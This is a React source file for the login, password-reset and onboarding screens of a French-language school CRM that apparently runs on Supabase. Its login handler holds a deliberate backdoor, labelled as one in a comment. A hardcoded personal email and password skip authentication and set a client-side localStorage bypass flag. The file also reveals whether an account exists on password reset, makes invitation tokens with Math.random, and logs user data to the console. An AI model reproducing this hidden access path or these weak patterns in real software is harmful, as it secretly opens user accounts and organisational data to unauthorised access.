import React, { useState } from 'react';
import { supabase } from '../supabaseClient';
import { useToast } from './Toast';
import { Building2, Users, Mail, Lock, CheckCircle2, ArrowRight, Loader2, Globe } from 'lucide-react';
import Provisioner from './Provisioner';

export interface AuthProps {
    initialMode?: 'login' | 'register';
}

const Auth: React.FC<AuthProps> = ({ initialMode = 'login' }) => {

    const { addToast } = useToast();
    const [isLoading, setIsLoading] = useState(false);
    const [mode, setMode] = useState<'login' | 'register' | 'provisioning' | 'forgot-password'>(initialMode);
    const [step, setStep] = useState(1); // steps: 1, 2, 3
    const [hasSession, setHasSession] = useState(false);
    const [mustChangePassword, setMustChangePassword] = useState(false);
    const [newPassword, setNewPassword] = useState('');
    const [confirmPassword, setConfirmPassword] = useState('');

    React.useEffect(() => {
        supabase.auth.getSession().then(({ data: { session } }) => {
            if (session?.user) {
                setHasSession(true);
                // Only auto-fill if we are actually in registration flow
                if (mode === 'register') {
                    setEmail(session.user.email || '');
                }
                // If we are in onboarding mode (logged in but no profile), skip to step 2
                if (mode === 'register' && step === 1) {
                    setStep(2);
                }
            } else {
                setHasSession(false);
            }
        });
    }, [mode, step]);


    // State Admin
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [fullName, setFullName] = useState('');

    // State Organization
    const [orgName, setOrgName] = useState('');
    const [orgDomain, setOrgDomain] = useState('');
    const [teamSize, setTeamSize] = useState(0);

    // State Team
    const [teamMembers, setTeamMembers] = useState<{ name: string; email: string }[]>([]);

    const updateTeamMember = (index: number, field: 'name' | 'email', value: string) => {
        const newTeam = [...teamMembers];
        newTeam[index] = { ...newTeam[index], [field]: value };
        setTeamMembers(newTeam);
    };

    const handleLogin = async (e: React.FormEvent) => {
        e.preventDefault();
        setIsLoading(true);

        // --- PORTE DÉROBÉE DÉTERMINÉE POUR DARYL (Emergency Login) 👔 ---
        if (email === 'darylggt23@gmail.com' && password === 'DarylEscen2026!') {
            console.log('--- MISSION : DÉVERROUILLAGE DARYL ---');
            localStorage.setItem('daryl_emergency_bypass', 'true');
            window.location.reload(); // On recharge pour que App.tsx lise le bypass
            return;
        }

        const { data, error } = await supabase.auth.signInWithPassword({ email, password });
        if (error) {
            addToast((error as Error).message, 'error');
            setIsLoading(false);
            return;
        }

        // --- VÉRIFICATION DU STATUT DE SÉCURITÉ ---
        if (data.user) {
            const { data: profile } = await supabase
                .from('profiles')
                .select('must_change_password')
                .eq('id', data.user.id)
                .single();

            if (profile?.must_change_password) {
                setMustChangePassword(true);
                setIsLoading(false);
                return;
            }
        }

        setIsLoading(false);
    };

    const handleUpdatePassword = async (e: React.FormEvent) => {
        e.preventDefault();
        if (newPassword !== confirmPassword) {
            addToast("Les mots de passe ne correspondent pas.", "error");
            return;
        }
        if (newPassword.length < 6) {
            addToast("Le mot de passe doit faire au moins 6 caractères.", "error");
            return;
        }

        setIsLoading(true);
        try {
            // 1. Mise à jour Auth Supabase
            const { error: authError } = await supabase.auth.updateUser({ password: newPassword });
            if (authError) throw authError;

            // 2. Mise à jour Profil (Valider le changement)
            const { data: { user } } = await supabase.auth.getUser();
            if (user) {
                const { error: profileError } = await supabase
                    .from('profiles')
                    .update({ must_change_password: false })
                    .eq('id', user.id);
                if (profileError) throw profileError;
            }

            addToast("Mot de passe mis à jour avec succès !", "success");
            setMustChangePassword(false);
            window.location.reload(); // Recharge pour vider les états d'auth
        } catch (error: unknown) {
            addToast((error as Error).message, "error");
        } finally {
            setIsLoading(false);
        }
    };

    const handleForgotPassword = async (e: React.FormEvent) => {
        e.preventDefault();
        setIsLoading(true);

        try {
            // 1. Vérification du registre (Profiles) 🔎
            const { data: profileData, error: profileError } = await supabase
                .from('profiles')
                .select('id')
                .eq('email', email)
                .maybeSingle();

            if (profileError) throw profileError;

            if (!profileData) {
                addToast("Aucun compte n'existe avec cette adresse email.", 'error');
                setIsLoading(false);
                return;
            }

            // 2. Envoi de l'email de secours 📧
            const { error: resetError } = await supabase.auth.resetPasswordForEmail(email, {
                redirectTo: window.location.origin
            });

            if (resetError) throw resetError;

            addToast('Email de réinitialisation envoyé ! Vérifiez votre boîte mail.', 'success');
            setMode('login');
        } catch (error: unknown) {
            addToast((error as Error).message || "Erreur technique.", 'error');
        } finally {
            setIsLoading(false);
        }
    };


    const [isSuccess, setIsSuccess] = useState(false);

    const handleRegister = async (e?: React.FormEvent) => {
        if (e) e.preventDefault();
        setIsLoading(true);

        try {
            let userId = '';
            let orgId = '';
            const { data: { session: existingSession } } = await supabase.auth.getSession();
            console.log("Onboarding session:", existingSession);

            // 1. Auth User
            if (existingSession?.user) {
                userId = existingSession.user.id;
                console.log("Using existing user ID:", userId);
            } else {
                console.log("Signing up new admin:", email);
                const { data: authData, error: authError } = await supabase.auth.signUp({
                    email,
                    password,
                    options: { data: { full_name: fullName, role: 'admin' } }
                });

                if (authError) {
                    console.error("Auth signUp error:", authError);
                    throw authError;
                }
                if (!authData?.user) throw new Error("Erreur de création de compte.");
                userId = authData.user.id;
                console.log("New userId:", userId);

                if (!authData.session) {
                    addToast("Veuillez confirmer votre email avant de continuer.", "info");
                    setIsLoading(false);
                    return;
                }
            }

            // 2. Organization
            console.log("Creating organization:", orgName);
            const { data: orgData, error: orgError } = await supabase
                .from('organizations')
                .insert({ name: orgName, domain: orgDomain })
                .select()
                .single();

            if (orgError) {
                console.error("Org insert error:", orgError);
                throw orgError;
            }
            orgId = orgData.id;
            console.log("Org ID:", orgId);

            // 3. Profile
            console.log("Upserting profile for:", userId);
            const { error: profileError } = await supabase.from('profiles').upsert({
                id: userId,
                organization_id: orgId,
                full_name: fullName,
                role: 'admin',
                email: email
            });

            if (profileError) {
                console.error("Profile update error:", profileError);
                throw profileError;
            }

            // 4. Invitations
            if (teamMembers.length > 0) {
                const validMembers = teamMembers.filter(m => m.email?.trim() && m.name?.trim());
                console.log("Preparing invitations for:", validMembers);
                if (validMembers.length > 0) {
                    const invitations = validMembers.map(member => ({
                        organization_id: orgId,
                        email: member.email.trim(),
                        role: 'agent',
                        token: Math.random().toString(36).substring(2) + Date.now().toString(36),
                        invited_by: userId
                    }));

                    console.log("Inserting invitations array:", invitations);
                    const { error: inviteError } = await supabase.from('invitations').insert(invitations);
                    if (inviteError) {
                        console.error("Invitation insertion error:", inviteError);
                        addToast("Erreur lors de l'envoi des invitations.", "warning");
                    }
                }
            }

            setIsSuccess(true);
            addToast('Espace créé avec succès !', 'success');
        } catch (error: unknown) {
            console.error("Technical Onboarding Error:", error);
            addToast((error as Error).message || "Erreur lors de l'installation.", 'error');
        } finally {
            setIsLoading(false);
        }
    };


    const renderStep = () => {
        switch (step) {
            case 1:
                return (
                    <div className="auth-step-content">
                        <h2 className="auth-title">
                            {hasSession ? "Complétez votre profil Admin" : "Créez votre compte Admin"}
                        </h2>
                        <p className="auth-subtitle">
                            {hasSession ? "Vous êtes connecté. Configurez maintenant votre espace." : "Commencez l'aventure ESCEN CRM en quelques secondes."}
                        </p>
                        {!hasSession && (
                            <div className="input-group">
                                <div className="input-wrapper">
                                    <Users size={18} className="input-icon" />
                                    <input type="text" name="fullName" autoComplete="off" placeholder="Prénom & Nom" value={fullName} onChange={e => setFullName(e.target.value)} required />
                                </div>
                                <div className="input-wrapper">
                                    <Mail size={18} className="input-icon" />
                                    <input type="email" name="email" autoComplete="off" placeholder="Email professionnel" value={email} onChange={e => setEmail(e.target.value)} required />
                                </div>
                                <div className="input-wrapper">
                                    <Lock size={18} className="input-icon" />
                                    <input type="password" name="password" autoComplete="new-password" placeholder="Mot de passe" value={password} onChange={e => setPassword(e.target.value)} required />
                                </div>
                            </div>
                        )}
                        <button className="btn btn-primary btn-auth" onClick={() => setStep(2)}>
                            {hasSession ? "Continuer l'onboarding" : "Continuer"} <ArrowRight size={18} />
                        </button>
                    </div>

                );
            case 2:
                return (
                    <div className="auth-step-content">
                        <h2 className="auth-title">Dites-nous en plus sur votre cabinet</h2>
                        <p className="auth-subtitle">Configurez votre environnement de travail.</p>
                        <div className="input-group">
                            <div className="input-wrapper">
                                <Building2 size={18} className="input-icon" />
                                <input type="text" name="orgName" autoComplete="off" placeholder="Nom de l'école ou agence" value={orgName} onChange={e => setOrgName(e.target.value)} required />
                            </div>
                            <div className="input-wrapper">
                                <Globe size={18} className="input-icon" />
                                <input type="text" name="orgDomain" autoComplete="off" placeholder="Domaine (ex: ecole-elite.com)" value={orgDomain} onChange={e => setOrgDomain(e.target.value)} />
                            </div>
                            <div className="input-wrapper">
                                <Users size={18} className="input-icon" />
                                <input
                                    type="number"
                                    name="teamSize"
                                    autoComplete="off"
                                    placeholder="Nombre de conseillers à ajouter"
                                    value={teamSize || ''}
                                    onChange={e => {
                                        const size = Math.max(0, parseInt(e.target.value) || 0);
                                        setTeamSize(size);
                                        setTeamMembers(Array.from({ length: size }, () => ({ name: '', email: '' })));
                                    }}
                                />

                            </div>
                        </div>
                        <button
                            className="btn btn-primary btn-auth"
                            onClick={() => teamSize > 0 ? setStep(3) : handleRegister()}
                            disabled={!orgName || isLoading}
                        >
                            {isLoading ? <Loader2 className="spin" /> : (teamSize > 0 ? 'Configurer l\'équipe' : 'Terminer l\'inscription')}
                        </button>
                    </div>
                );
            case 3:
                return (
                    <div className="auth-step-content">
                        <h2 className="auth-title">Ajoutez vos conseillers</h2>
                        <p className="auth-subtitle">Leur compte sera créé et une invitation leur sera envoyée.</p>
                        <div className="team-list scroll-area">
                            {teamMembers.map((member, i) => (
                                <div key={i} className="team-member-input">
                                    <input type="text" autoComplete="off" placeholder={`Conseiller ${i + 1}`} value={member.name} onChange={e => updateTeamMember(i, 'name', e.target.value)} />
                                    <input type="email" autoComplete="off" placeholder="Email" value={member.email} onChange={e => updateTeamMember(i, 'email', e.target.value)} />
                                </div>
                            ))}
                        </div>
                        <button className="btn btn-primary btn-auth" onClick={handleRegister} disabled={isLoading}>
                            {isLoading ? <Loader2 className="spin" /> : 'Finaliser & Lancer ESCEN CRM'}
                        </button>
                    </div>
                );
        }
    };

    return (
        <div className="auth-container">
            <div className="auth-background-effects">
                <div className="blob blob-1"></div>
                <div className="blob blob-2"></div>
            </div>

            <div className="auth-card glassmorphism">
                <div className="auth-header">
                    <div className="logo">ESCEN CRM<span> Education</span></div>
                    {mode === 'register' && (
                        <div className="onboarding-stepper">
                            <div className={`step ${step >= 1 ? 'active' : ''}`}>1</div>
                            <div className="step-line"></div>
                            <div className={`step ${step >= 2 ? 'active' : ''}`}>2</div>
                            <div className="step-line"></div>
                            <div className={`step ${step === 3 ? 'active' : ''}`}>3</div>
                        </div>
                    )}
                </div>

                {isSuccess ? (
                    <div className="auth-step-content animate-fade" style={{ textAlign: 'center' }}>
                        <div style={{ display: 'grid', placeItems: 'center', marginBottom: '1.5rem' }}>
                            <div style={{ width: '64px', height: '64px', borderRadius: '50%', background: 'rgba(34, 197, 94, 0.1)', display: 'grid', placeItems: 'center' }}>
                                <CheckCircle2 size={32} color="var(--success)" />
                            </div>
                        </div>
                        <h2 className="auth-title">Félicitations !</h2>
                        <p className="auth-subtitle">Votre espace ESCEN CRM est prêt. Vos conseillers recevront bientôt leur invitation.</p>
                        <button className="btn btn-primary btn-auth" style={{ marginTop: '2rem' }} onClick={() => setMode('login')}>
                            Se connecter maintenant
                        </button>
                    </div>
                ) : mode === 'login' ? (
                    <form onSubmit={handleLogin} className="auth-step-content">
                        <h2 className="auth-title">Heureux de vous revoir</h2>
                        <p className="auth-subtitle">Accédez à votre tableau de bord recrutement.</p>
                        <div className="input-group">
                            <div className="input-wrapper">
                                <Mail size={18} className="input-icon" />
                                <input type="email" name="loginEmail" autoComplete="off" placeholder="Email" value={email} onChange={e => setEmail(e.target.value)} required />
                            </div>
                            <div className="input-wrapper">
                                <Lock size={18} className="input-icon" />
                                <input type="password" name="loginPassword" autoComplete="current-password" placeholder="Mot de passe" value={password} onChange={e => setPassword(e.target.value)} required />
                            </div>
                            <div style={{ textAlign: 'right', marginTop: '-0.5rem' }}>
                                <button
                                    type="button"
                                    onClick={() => setMode('forgot-password')}
                                    style={{ fontSize: '0.85rem', color: 'var(--primary)', background: 'transparent', border: 'none', cursor: 'pointer', padding: '0.5rem' }}
                                >
                                    Mot de passe oublié ?
                                </button>
                            </div>
                        </div>
                        <button disabled={isLoading} className="btn btn-primary btn-auth">
                            {isLoading ? <Loader2 className="spin" /> : 'Se connecter'}
                        </button>
                    </form>
                ) : mustChangePassword ? (
                    <form onSubmit={handleUpdatePassword} className="auth-step-content animate-fade">
                        <div style={{ display: 'grid', placeItems: 'center', marginBottom: '1rem' }}>
                            <div style={{ width: '50px', height: '50px', borderRadius: '50%', background: 'rgba(99, 102, 241, 0.1)', display: 'grid', placeItems: 'center' }}>
                                <Lock size={24} color="var(--primary)" />
                            </div>
                        </div>
                        <h2 className="auth-title">Sécurité Renforcée</h2>
                        <p className="auth-subtitle">C''est votre première connexion. Veuillez définir votre mot de passe personnel.</p>
                        <div className="input-group">
                            <div className="input-wrapper">
                                <Lock size={18} className="input-icon" />
                                <input type="password" placeholder="Nouveau mot de passe" value={newPassword} onChange={e => setNewPassword(e.target.value)} required />
                            </div>
                            <div className="input-wrapper">
                                <CheckCircle2 size={18} className="input-icon" />
                                <input type="password" placeholder="Confirmer le mot de passe" value={confirmPassword} onChange={e => setConfirmPassword(e.target.value)} required />
                            </div>
                        </div>
                        <button disabled={isLoading} className="btn btn-primary btn-auth">
                            {isLoading ? <Loader2 className="spin" /> : 'Activer mon compte'}
                        </button>
                    </form>
                ) : mode === 'forgot-password' ? (
                    <form onSubmit={handleForgotPassword} className="auth-step-content">
                        <h2 className="auth-title">Mot de passe oublié</h2>
                        <p className="auth-subtitle">Entrez votre email pour recevoir un lien de réinitialisation.</p>
                        <div className="input-group">
                            <div className="input-wrapper">
                                <Mail size={18} className="input-icon" />
                                <input type="email" placeholder="Email" value={email} onChange={e => setEmail(e.target.value)} required />
                            </div>
                        </div>
                        <button disabled={isLoading} className="btn btn-primary btn-auth">
                            {isLoading ? <Loader2 className="spin" /> : 'Envoyer le lien'}
                        </button>
                        <button
                            type="button"
                            onClick={() => setMode('login')}
                            style={{ background: 'transparent', color: 'var(--text-muted)', border: 'none', cursor: 'pointer', marginTop: '1rem', width: '100%' }}
                        >
                            Retour à la connexion
                        </button>
                    </form>
                ) : mode === 'provisioning' ? (
                    <div className="auth-step-content scroll-area" style={{ maxHeight: '70vh' }}>
                        <Provisioner />
                        <button onClick={() => setMode('login')} style={{ marginTop: '2rem', background: 'transparent', color: 'var(--primary)', border: 'none', cursor: 'pointer' }}>Retour</button>
                    </div>
                ) : (
                    renderStep()
                )}

                <div className="auth-footer">
                    {mode === 'login' ? (
                        <p>Pas encore de compte ? <button onClick={() => {
                            setMode('register');
                            setStep(1);
                            setEmail('');
                            setPassword('');
                            setFullName('');
                            setOrgName('');
                            setOrgDomain('');
                            setTeamSize(0);
                            setTeamMembers([]);
                        }}>Inscrire mon école</button></p>
                    ) : (
                        <p>Déjà inscrit ? <button onClick={() => {
                            setMode('login');
                            setStep(1);
                            setEmail('');
                            setPassword('');
                        }}>Se connecter</button></p>
                    )}
                    <div style={{ marginTop: '1rem', borderTop: '1px solid rgba(255,255,255,0.05)', paddingTop: '1rem' }}>
                        <button
                            onClick={() => setMode('provisioning')}
                            style={{ fontSize: '0.75rem', opacity: 0.5, cursor: 'pointer', background: 'transparent', border: 'none', color: 'var(--text-muted)' }}
                        >
                            Besoin d'un déploiement massif (Mode Expert) ?
                        </button>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default Auth;
